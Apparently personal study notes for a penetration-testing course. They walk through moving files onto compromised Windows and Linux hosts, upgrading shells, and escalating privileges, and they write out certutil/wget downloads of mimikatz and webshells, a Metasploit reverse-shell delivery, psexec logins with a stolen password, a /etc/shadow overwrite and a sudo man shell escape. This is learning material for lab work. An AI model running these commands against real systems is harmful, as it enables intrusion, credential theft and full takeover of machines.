  

### ==**Transferring Files To Windows & Linux Targets**==

  

- ==Setting Up A Web Server With Python==

> After obtaining initial access to target system , you will need to transfer files to the target system .

> python comes with built-in module known as `http.server` used to facilitate a simple HTTP server that gives u standard GET and HEAD request handlers .

  

- Setting Up A Web Server With Python
    
    - address the file u want to transfer , copy the path
    - Now `cd < the copied path >` ⇒ ==_To host any dir we want_==
    - After we copied file to the dir we want ⇒ `python3 -m http.server 80`
    
    > here we setup a web server via python , we can navigate it by reach [`http://127.0.0.1/`](http://127.0.0.1/) || `http://<linux ip >`
    
    - After we reach the web server , we can write any file and visit dir … etc.
    
      
    

  

- Transferring Files To Windows Targets
    
    - `nmap -sV -sS -O <target ip >` ⇒ To scan the target for open ports and what services are running on this ports
    - Find the services are running and try to exploit it .
    - After we gain access to target system via exploit the services running .
    - so now we need to transfer the exploit file to the target system
    - So after we exploit the service , we will get as example a command shell , so here we have a command shell not a metepreter session
    - On this point as a example we have just a administrator privis , so we need to escalation our privis to root privis
    
    > So we need to transfer a mimikatz to the target system as we know is a windows target , we need to transfer mimikatz
    
    - ==On local== ⇒ `python3 -m http.server 80` ⇒ to open a web server
        - `cd /usr/share/windows-resources/mimikatz/x64`
    - ==On target== ⇒ `cd c:\\` && `mkdir Temp` && `cd Temp`
        - `certutil -urlcache -f http://<our ip >/<file we want to transfer exploit.exe` ⇒ it’s worked as wget , it will navigate our ip and get the file .
    

  

- Transferring Files To Linux Targets
    
    - `nmap -sV -sS -O <target ip >` ⇒ To scan the target for open ports and what services are running on this ports
    - Find the services are running and try to exploit it .
    - After we gain access to target system via exploit the services running .
    - so now we need to transfer the exploit file to the target system
    - So after we exploit the service , we will get as example a command shell , so here we have a command shell not a metepreter session
    - On this point as a example we have just a administrator privis , so we need to escalation our privis to root privis
    
    💡
    
    T-Mux ⇒ Is a terminal multiplexer that allows you to have multiple terminal sessions within one terminal
    
    - `tmux` ⇒ that will open a new terminal session to work with
    - `cd /usr/share/webshells/php` ⇒ to navigate the webshells file
        - `python3 -m http.server 80`
    - ==On Target system== ⇒ `wget http://< our ip >/<file we want to transfer>`
    
      
    

  

  

  

### ==_**Shells**_==

  

- ==Upgrading Non-Interactive Shells==
    
    - `nmap -sV -sS -O <target ip >` ⇒ To scan the target for open ports and what services are running on this ports
    - Find the services are running and try to exploit it .
    - After we gain access to target system via exploit the services running .
    - `cat /etc/shells` ⇒ that will list all shells we have on target system to interact with them
    
    > if python installed , and we can a command with it , to check ⇒ `python - -version`
    
    - `python3 -c ‘import pty; pty.spawn(”/bin/bash”)’` ⇒ that will give us a bash session if it’s not installed on the target .
    
    > Any other shell u want to get , search to programing Lang that is made with , then search how to get it
    

  

  

  

## ==_**Escalation**_==

### ==Windows Privilege Escalation==

  

- ==_Identifying Windows Privilege Escalation Vulnerabilities_==

> in order to elevate your privileges on windows , you must first identify privilege escalation vuln that exist on the target system

> `PrivescCheck` ⇒ This script aims to eunmerate common windows configuration issues that can be leveraged for local privilege escalation
> 
> - [https://github.com/item4n/PrivescCheck](https://github.com/item4n/PrivescCheck)

  

- _Identifying Windows Privilege Escalation Vulnerabilities_
    
    > let’s assume we have a two tabs ⇒ our machine (kali) && target system (windows) , we have access on target system , but we dose not have a shell session on kali
    
    - `search web_delivery` && `use exploit/multi/script/web_delivery`
    
    > ==web_delivery== ⇒ ==is a msfconsole module that used to ⇒ it’s generate a command , when the target run this command on his machine that will open shell session on our kali machine==
    
    - `set target PSH\ (Binary)` && `set payload windows/shell/reverse_tcp` && `set PSH-Encodedcommand false` && `set lhost <our ip>` && `exploit` ⇒ when that execute we will see a powershell command appear , so just we need the target to run it on his command prompt
    - if we back to kali we can see a shell session opened
    - Now we need to make it a metepreter session ⇒ `search shell_to_metepreter` && `use post/multi/manage/shell_to_metepreter` && `set lhost < our ip>` && `set session 1` && `set win_transfer VBS` && `exploit` ⇒ then we will received a metepreter session
    - `migrate to x64`
    - now with one of the transferring file method , transfer the `PrivescCheck` script to the target system
    - ON GITHUB REPO WE WILL FIND THE A LOT OF TYPES OD USAGE ⇒ `copy one of them and run it on target`
    - when u run it ⇒ ==it will back with a lot of info and types of privilege escalation we can export==
    
      
    

  

  

- _Windows Privilege Escalation_
    
    - After we identify what privilege escalation vuln we have on target system
    - Let’s assume we obtain one of the priviscCheck result is the administrator password
    - Using ==[psexec.py](http://psexec.py)== ⇒ `psexec.py Administrator@<target ip>` && `enter the password`
    - using psexec On msfconsole ⇒ `use exploit/windows/smb/psexec` && `set lhost <your ip >` && `set lport 1234` && `set smbuser administrator` && `set smbpass <the password >` && `set rhost <target ip>` && `run`
    
      
    

  

  

### ==_**Linux Privilege Escalation**_==

  

- ==Linux Privilege Escalation - Weak Permissions==

> `LinEnum` ⇒ to automate the process of identify Privilege Escalation

> As we know in linux we can as a example limit some files , or I want only the root user to modify the file or execute it ⇒ so here we are going to to be trying to identify files that are cannot be edited by standard user , and try to find one of these file have a misconfigured

  

- Linux Privilege Escalation - Weak Permissions
    
    - After we get access on target system
    - `find / -not -type l -perm -o+w` ⇒ so here we want to list all files that can be edited with everyone on the system
    - so now we want to try find a file can be helpful with elevate our privilege
    - try to find files under /etc ⇒ as example `/etc/shadow`
    - so this file have all users hashes and maybe the passwords so this is huge security misconfiguration
    - So in this example we have ability to edit the /etc/shadow file ⇒ but we know that the file continue the users hashes , soif we want to edit the file we need to hash it before edit
    - `openssl passwd -1 -salt abc password` ⇒ that will hash the “password” in weakest hash algorithm
    - copy the result and with any texteditor modify the value to the new one
    - now `su` && ask to enter the password ⇒ `password` , and boom we logged on as root
    
      
    
      
    
      
    

  

- Linux Privilege Escalation - SUDO Privileges
    
    - After we get access on target system
    - `sudo -l` ⇒ that will return with what command the user can make without root privilege
    - So if we find any binary we can executed without root privilege
    - let’s assume the command return with ⇒ the user can make or run man with sudo without root password , that’s mean the users can run man with sudo without privileges , so this is misconfiguration on sudo
    - so if we run this ⇒ `sudo man ls` , we can see that return with man page of ls
    - ==_now we know that man page can actually run any command , so if we run the command and we run the man via sudo we will run this command with root privilege_==
    - `sudo man ls` && when it’s open ⇒ `!/bin/bash`
    
    > so because we can run the man with sudo , when this command executer it’s will return with bash session with root privilege